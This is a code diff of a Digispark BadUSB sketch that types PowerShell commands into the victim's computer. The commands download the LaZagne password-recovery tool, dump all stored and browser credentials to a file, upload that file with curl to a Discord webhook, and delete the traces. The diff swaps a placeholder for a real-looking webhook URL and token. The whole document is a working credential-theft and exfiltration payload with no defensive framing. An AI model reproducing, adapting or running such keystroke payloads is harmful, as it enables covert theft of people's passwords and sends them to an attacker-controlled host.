@@ -80,7 +80,7 @@ void loop() {
 	DigiKeyboard.print("$Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine');Start-BitsTransfer https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe -Destination \"$Test/l.exe\"; cd $Test");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(15000);
-	DigiKeyboard.print(".\\l.exe all -vv > \"$env:computername.txt\"; .\\l.exe browsers -vv >> \"$env:computername.txt\"; curl.exe [DISCORD WEBHOOK URL] -F \"file1=@$Test/$env:computername.txt\"; Remove-Item \"$x/$env:computername.txt\", \"$x/l.exe\" -Force -ErrorAction SilentlyContinue");
+	DigiKeyboard.print(".\\l.exe all -vv > \"$env:computername.txt\"; .\\l.exe browsers -vv >> \"$env:computername.txt\"; curl.exe [https://discord.com/api/webhooks/1173011529491296286/5F-i0yxrzHsmHVtmepVJtW3HPX4aRWxKPtvxwPCDve1G34j27jL7wP4khTMZoR5Wet4G] -F \"file1=@$Test/$env:computername.txt\"; Remove-Item \"$x/$env:computername.txt\", \"$x/l.exe\" -Force -ErrorAction SilentlyContinue");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.print("exit");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
